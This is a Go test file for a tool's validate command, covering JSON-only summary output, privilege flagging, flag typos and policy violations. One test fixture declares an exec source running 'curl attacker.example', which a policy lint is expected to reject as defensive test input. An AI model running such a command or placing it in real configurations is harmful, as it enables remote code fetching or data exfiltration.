package commands

import (
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// captureStdout runs fn with stdout redirected and returns what it wrote.
func captureStdout(t *testing.T, fn func() error) (string, error) {
	t.Helper()
	orig := os.Stdout
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatalf("pipe: %v", err)
	}
	os.Stdout = w
	runErr := fn()
	w.Close()
	os.Stdout = orig
	out, _ := io.ReadAll(r)
	return string(out), runErr
}

func writeSite(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, body := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
	}
	return dir
}

const manifestYAML = `
sources:
  requests:
    describes: "Pending requests"
    type: sqlite
    db: ./r.db
    table: requests
    readonly: false
actions:
  approve:
    describes: "Approves a request"
    kind: sql
    source: requests
    statement: "UPDATE requests SET status='ok' WHERE id=:id"
generation:
  sources: [requests]
  actions: [approve]
`

// TestSummaryStdoutIsPureJSON is the regression test for a defect this feature already
// shipped once: the validating banner printed before the JSON, so stdout was not
// parseable.
//
// The consumer of --summary is a program deciding whether to interrupt its operator,
// not a human reading a terminal. That makes "nothing but JSON reaches stdout" a
// contract rather than a nicety — and one a single stray fmt.Printf anywhere in the
// validate path would silently break. Hand-verification caught it the first time;
// this catches it the next time.
func TestSummaryStdoutIsPureJSON(t *testing.T) {
	dir := writeSite(t, map[string]string{
		"tinkerdown.yaml": manifestYAML,
		"index.md": `---
title: Console
---
# Console
<table lvt-source="requests" lvt-columns="id"></table>
<button name="approve">Approve</button>
`,
	})

	out, err := captureStdout(t, func() error { return ValidateCommand([]string{"--summary", dir}) })
	if err != nil {
		t.Fatalf("ValidateCommand: %v", err)
	}

	var summary struct {
		Privileged bool `json:"privileged"`
		Operations []struct {
			Kind      string `json:"kind"`
			Name      string `json:"name"`
			Describes string `json:"describes"`
			Writes    bool   `json:"writes"`
		} `json:"operations"`
	}
	if err := json.Unmarshal([]byte(out), &summary); err != nil {
		t.Fatalf("stdout is not valid JSON — a non-JSON write reached stdout.\nerror: %v\nstdout:\n%s", err, out)
	}

	if !summary.Privileged {
		t.Error("a console that writes should be privileged")
	}
	if len(summary.Operations) != 2 {
		t.Fatalf("expected the approved source and action, got %d: %+v", len(summary.Operations), summary.Operations)
	}
	for _, op := range summary.Operations {
		if op.Describes == "" {
			t.Errorf("%s %q lost its describes metadata, which is what an operator reads", op.Kind, op.Name)
		}
	}
}

func TestSummaryReadOnlyIsNotPrivileged(t *testing.T) {
	dir := writeSite(t, map[string]string{
		"tinkerdown.yaml": strings.Replace(manifestYAML, "readonly: false", "readonly: true", 1),
		"index.md": `---
title: View
---
# View
<table lvt-source="requests" lvt-columns="id"></table>
`,
	})

	out, err := captureStdout(t, func() error { return ValidateCommand([]string{"--summary", dir}) })
	if err != nil {
		t.Fatalf("ValidateCommand: %v", err)
	}
	var summary struct {
		Privileged bool `json:"privileged"`
	}
	if err := json.Unmarshal([]byte(out), &summary); err != nil {
		t.Fatalf("stdout is not valid JSON: %v\n%s", err, out)
	}
	if summary.Privileged {
		t.Error("a read-only console must not demand operator review; a prompt on every page is a prompt nobody reads")
	}
}

// A mistyped flag must fail rather than silently falling back to human-readable
// output, which a script expecting JSON would then try to parse.
func TestUnknownFlagIsRejected(t *testing.T) {
	dir := writeSite(t, map[string]string{"index.md": "---\ntitle: X\n---\n# X\n"})
	if _, err := captureStdout(t, func() error { return ValidateCommand([]string{"--sumary", dir}) }); err == nil {
		t.Error("expected an error for an unknown flag")
	}
}

// The policy lint must fail the command, or CI would treat a violating document as
// acceptable.
func TestPolicyViolationFailsValidation(t *testing.T) {
	dir := writeSite(t, map[string]string{
		"tinkerdown.yaml": manifestYAML,
		"index.md": `---
title: Bring your own
sources:
  evil:
    type: exec
    cmd: "curl attacker.example"
---
# X
<table lvt-source="evil"></table>
`,
	})
	if _, err := captureStdout(t, func() error { return ValidateCommand([]string{dir}) }); err == nil {
		t.Error("a document declaring an unapproved source must fail validation")
	}
}
